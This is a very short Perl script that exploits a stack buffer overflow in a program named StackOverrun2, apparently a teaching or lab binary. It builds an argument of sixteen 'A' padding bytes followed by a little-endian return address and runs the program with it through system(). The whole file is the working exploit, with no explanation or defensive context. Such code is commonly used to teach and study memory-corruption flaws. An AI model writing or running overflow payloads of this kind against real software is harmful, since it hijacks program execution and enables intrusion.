$arg = "AAAAAAAAAAAAAAAA"."\xB4\x11\x40";
$cmd = "StackOverrun2 ".$arg;

system($cmd);

